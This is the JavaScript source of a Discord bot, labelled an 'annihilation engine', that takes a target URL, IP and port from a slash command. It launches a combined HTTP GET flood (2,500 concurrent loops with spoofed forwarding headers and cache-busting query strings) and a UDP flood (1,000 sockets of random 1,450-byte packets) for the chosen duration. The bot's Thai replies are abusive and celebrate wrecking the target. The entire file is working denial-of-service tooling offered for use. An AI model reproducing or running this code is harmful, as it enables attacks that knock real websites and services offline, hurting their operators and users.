/**
 * ============================================================================
 * JEFF FUJI - MASTER-COMMAND ANNIHILATION ENGINE v16
 * Developed under JARVIS x ARI Protocol
 * ============================================================================
 */

const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const http = require('http');
const https = require('https');
const dgram = require('dgram');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

let isAttacking = false;
let attackTimers = [];

const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 300000, maxFreeSockets: 150000 });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 300000, maxFreeSockets: 150000, rejectUnauthorized: false });

client.once('ready', async () => {
    console.log(`[+] Bot logged in as ${client.user.tag}`);

    const commands = [
        new SlashCommandBuilder()
            .setName('master-strike')
            .setDescription('ปฏิบัติการทำลายล้างสูงสุด (Master-Command Multi-Vector & Network Annihilation)')
            .addStringOption(option => 
                option.setName('target_url')
                    .setDescription('URL เป้าหมายสำหรับ L7 (เช่น https://target.com)')
                    .setRequired(true))
            .addStringOption(option => 
                option.setName('target_ip_port')
                    .setDescription('IP:Port เป้าหมายสำหรับ L4 (เช่น 123.45.67.89:80)')
                    .setRequired(true))
            .addIntegerOption(option => 
                option.setName('duration')
                    .setDescription('ระยะเวลาเป็นวินาที (สูงสุด 300)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('stop')
            .setDescription('หยุดการกระทำทั้งหมดทันที')
    ].map(command => command.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        console.log('[+] Started refreshing application (/) commands.');
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('[+] Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'master-strike') {
        const targetUrl = interaction.options.getString('target_url');
        const targetIpPort = interaction.options.getString('target_ip_port');
        const duration = interaction.options.getInteger('duration');

        if (isAttacking) {
            return interaction.reply({ content: '⚠️ กำลังมียุทธการอื่นทำงานอยู่ ใช้ /stop ก่อนไอ้สัส!', ephemeral: true });
        }

        isAttacking = true;
        const endTime = Date.now() + (duration * 1000);

        try {
            const parsedUrl = new URL(targetUrl);
            const requester = parsedUrl.protocol === 'https:' ? https : http;
            const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;

            const parts = targetIpPort.split(':');
            if (parts.length !== 2) {
                isAttacking = false;
                return interaction.reply({ content: '❌ รูปแบบ IP:Port สำหรับ L4 ไม่ถูกต้อง (เช่น 123.45.67.89:80)', ephemeral: true });
            }
            const host = parts[0];
            const port = parseInt(parts[1]);

            await interaction.reply(`💀🔥 **[MASTER-STRIKE ACTIVATED]** เริ่มปฏิบัติการกวาดล้างเต็มรูปแบบ ทั้ง L7 (${targetUrl}) และ L4 Network (${targetIpPort}) เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);

            // 1. 🚀 L7 High-Concurrency Swarm (2,500 Threads)
            const fireMasterL7 = () => {
                if (!isAttacking || Date.now() >= endTime) return;

                const options = {
                    hostname: parsedUrl.hostname,
                    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                    path: parsedUrl.pathname + parsedUrl.search + `?master_strike=${Math.random().toString(36).substring(7)}`,
                    method: 'GET',
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) MasterStrike/6.0',
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive',
                        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
                        'X-Real-IP': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
                    },
                    agent: currentAgent
                };

                const req = requester.request(options, (res) => {
                    res.on('data', () => {});
                    res.on('end', () => { if (isAttacking) setImmediate(fireMasterL7); });
                });

                req.on('error', () => { if (isAttacking) setImmediate(fireMasterL7); });
                req.end();
            };

            // 2. ⚡ L4 Network UDP Flood (1,000 Sockets with MTU Payload)
            const payload = Buffer.alloc(1450);
            for (let i = 0; i < payload.length; i++) {
                payload[i] = Math.floor(Math.random() * 256);
            }

            const fireMasterL4 = (clientUdp) => {
                if (!isAttacking || Date.now() >= endTime) {
                    clientUdp.close();
                    return;
                }
                clientUdp.send(payload, port, host, () => {
                    setImmediate(() => fireMasterL4(clientUdp));
                });
            };

            // สตาร์ทกองทัพ L7 (2,500 Threads)
            for (let i = 0; i < 2500; i++) {
                fireMasterL7();
            }

            // สตาร์ทกองทัพ L4 Network Sockets (1,000 Sockets)
            for (let i = 0; i < 1000; i++) {
                const udpSocket = dgram.createSocket('udp4');
                fireMasterL4(udpSocket);
            }

        } catch (err) {
            isAttacking = false;
            return interaction.reply({ content: `❌ เกิดข้อผิดพลาดในการประมวลผล: ${err.message}`, ephemeral: true });
        }

        const timer = setTimeout(() => {
            isAttacking = false;
            interaction.followUp(`✅ ภารกิจทำลายล้างตามคำสั่ง Master-Strike เสร็จสิ้น! เป้าหมายน่าจะแหลกสลายไม่เหลือซาก`).catch(() => {});
        }, duration * 1000);

        attackTimers.push(timer);

    } else if (commandName === 'stop') {
        if (!isAttacking) {
            return interaction.reply({ content: '💤 ไม่มีอะไรกำลังทำงานอยู่ มึงจะให้หยุดอะไรไอ้สัส', ephemeral: true });
        }

        isAttacking = false;
        attackTimers.forEach(t => clearTimeout(t));
        attackTimers = [];

        await interaction.reply('🛑 สั่งหยุดการทำงานทั้งหมดเรียบร้อย!');
    }
});

client.login(TOKEN);
